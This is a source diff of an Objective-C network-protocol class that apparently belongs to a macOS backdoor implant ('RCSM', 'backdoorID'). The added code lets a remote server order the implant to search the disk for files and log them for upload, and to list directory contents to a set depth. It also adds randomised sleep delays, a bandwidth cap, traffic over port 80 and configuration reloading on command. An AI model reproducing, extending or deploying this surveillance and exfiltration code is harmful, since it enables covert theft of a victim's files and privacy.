@@ -21,45 +21,48 @@
 #import "ByeNetworkOperation.h"
 
 #import "RCSMCommon.h"
+#import "RCSMFileSystemManager.h"
+#import "RCSMTaskManager.h"
 
 //#define DEBUG_PROTO
 
 
 @implementation RESTNetworkProtocol
 
-- (id)initWithHost: (NSString *)aHost
-            onPort: (int32_t)aPort
+- (id)initWithConfiguration: (NSData *)aConfiguration
 {
   if (self = [super init])
     {
-#ifdef DEBUG_TRANSPORT
-      infoLog(ME, @"host: %@", aHost);
-      infoLog(ME, @"port: %d", aPort);
-#endif
-      
-      if (aHost == nil
-          || [aHost isEqualToString: @""])
+      if (aConfiguration == nil)
         {
-#ifdef DEBUG_TRANSPORT
-          errorLog(ME, @"Host is null");
+#ifdef DEBUG_PROTO
+          errorLog(ME, @"configuration is nil");
 #endif
           
           [self release];
           return nil;
         }
       
-      if (aPort <= 0)
-        {
-#ifdef DEBUG_TRANSPORT
-          errorLog(ME, @"Port is invalid");
+      syncStruct *header  = (syncStruct *)[aConfiguration bytes];
+      mMinDelay           = header->minSleepTime;
+      mMaxDelay           = header->maxSleepTime;
+      mBandwidthLimit     = header->bandwidthLimit;
+      
+      NSString *host        = [NSString stringWithCString: header->configString];
+      /*NSString *backdoorID  = [NSString stringWithCString:
+                               header->configString
+                               + strlen(header->configString)
+                               + 1];*/
+      
+#ifdef DEBUG_PROTO
+      debugLog(ME, @"minDelay  : %d", mMinDelay);
+      debugLog(ME, @"maxDelay  : %d", mMaxDelay);
+      debugLog(ME, @"bandWidth : %d", mBandwidthLimit);
+      debugLog(ME, @"host      : %@", host);
 #endif
-          
-          [self release];
-          return nil;
-        }
       
       NSString *_url;
-      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", aHost, aPort];
+      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
       mURL    = [[NSURL alloc] initWithString: _url];
       [_url release];
       
@@ -86,7 +89,7 @@
   
   // Init the transport
   RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
-                                                         onPort: 8080];
+                                                         onPort: 80];
   
   AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
                                   initWithTransport: transport];
@@ -158,6 +161,47 @@
                 errorLog(ME, @"Error on DOWNLOAD");
 #endif
               }
+            else
+              {
+                NSArray *files = [downOP getDownloads];
+                
+                if ([files count] > 0)
+                  {
+                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                    
+                    for (NSString *fileMask in files)
+                      {
+#ifdef DEBUG_PROTO
+                        infoLog(ME, @"(PROTO_DOWNLOAD) Logging %@", fileMask);
+#endif
+                        
+                        NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
+                        if (filesFound == nil)
+                          {
+#ifdef DEBUG_PROTO
+                            errorLog(ME, @"fileMask (%@) didn't match any files");
+#endif
+                            continue;
+                          }
+                        
+                        for (NSString *file in filesFound)
+                          {
+#ifdef DEBUG_PROTO
+                            infoLog(ME, @"createLogForFile (%@)", file);
+#endif
+                            [fsManager logFileAtPath: file];
+                          }
+                      }
+                    
+                    [fsManager release];
+                  }
+                else
+                  {
+#ifdef DEBUG_PROTO
+                    errorLog(ME, @"(PROTO_DOWNLOAD) no file available");
+#endif
+                  }
+              }
             
             [downOP release];
           } break;
@@ -185,6 +229,40 @@
                 errorLog(ME, @"Error on FS");
 #endif
               }
+            else
+              {
+                NSArray *paths = [fsOP getPaths];
+#ifdef DEBUG_PROTO
+                infoLog(ME, @"paths: %@", paths);
+#endif
+                
+                if ([paths count] > 0)
+                  {
+                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                    
+                    for (NSDictionary *dictionary in paths)
+                      {
+                        NSString *path = [dictionary objectForKey: @"path"];
+                        uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
+                        
+#ifdef DEBUG_PROTO
+                        infoLog(ME, @"(PROTO_FS) path : %@", path);
+                        infoLog(ME, @"(PROTO_FS) depth: %d", depth);
+#endif
+                        
+                        [fsManager logDirContent: path
+                                       withDepth: depth];
+                      }
+                    
+                    [fsManager release];
+                  }
+                else
+                  {
+#ifdef DEBUG_PROTO
+                    errorLog(ME, @"(PROTO_FS) no path availalble");
+#endif
+                  }
+              }
             
             [fsOP release];
           } break;
@@ -198,7 +276,10 @@
     }
   
   LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
-                                initWithTransport: transport];
+                                initWithTransport: transport
+                                         minDelay: mMinDelay
+                                         maxDelay: mMaxDelay
+                                        bandwidth: mBandwidthLimit];
   
   if ([logOP perform] == NO)
     {
@@ -218,6 +299,26 @@
 #endif
     }
   [byeOP release];
+  
+  //
+  // Time to reload the configuration, if needed
+  // TODO: Refactor this
+  //
+  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
+  
+  if (_taskManager.mShouldReloadConfiguration == YES)
+    {
+#ifdef DEBUG_PROTO
+      warnLog(ME, @"Loading new configuration");
+#endif
+      [_taskManager reloadConfiguration];
+    }
+  else
+    {
+#ifdef DEBUG_PROTO
+      warnLog(ME, @"No new configuration");
+#endif
+    }
   
   [commandList release];
   [transport release];
